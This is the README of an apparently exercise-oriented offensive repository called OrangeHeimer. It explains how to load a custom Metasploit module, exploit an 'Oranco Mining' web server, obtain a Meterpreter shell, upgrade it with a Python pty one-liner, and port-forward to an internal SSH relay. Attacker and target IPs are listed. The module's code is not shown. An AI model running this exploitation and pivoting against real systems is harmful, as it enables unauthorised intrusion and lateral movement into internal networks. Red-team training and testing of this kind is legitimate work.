# OrangeHeimer
## Network Diagram
![OrangeHeimerNetwerk](https://github.com/user-attachments/assets/d6b00e75-2c73-411a-b7a7-92f11a9e2214)
## Stage 1: Oranco Mining Web Server Exploitation
### Objective
Exploit web server and set up connection to internal relay SSH
### Files:
- orangeland.py	– metasploit module
- stage1.rc – metasploit rc file
### IPs and Ports:
All can be customized in stage1.rc file
- thrower box	10.0.1.21:4444
- oranco Web	10.0.1.1:8443
- thrower SSH	127.0.0.1:22
- relay SSH	172.31.82.221:22
### How to Run:
- chmod +x orangeland.py
- move orangeland.py into metasploit-framework/embedded/framework/modules/exploits/unix/webapp/
- msfconsole -r exploit.rc -- may need to be run with sudo
### Possible Failures:
Orangeland.py has been tested on multiple ops and should work, if it doesn’t, then verbally harass the analysts.  
Portfwd add is the only new command, if this fails:
- verify that the SSH server is running at the IP and port as indicated, if they are different, re run the portfwd command with -p <SSH_PORT> -r <SSH_IP>
- run shell in meterpreter, upgrade using python3 -c 'import pty; pty.spawn("/bin/bash")', and verify that the SSH credentials work
- run the portfwd command with a different thrower port using -l <THROW_PORT> Note, this means that all future SSH commands cannot use sshpass and must use -p <THROW_PORT>
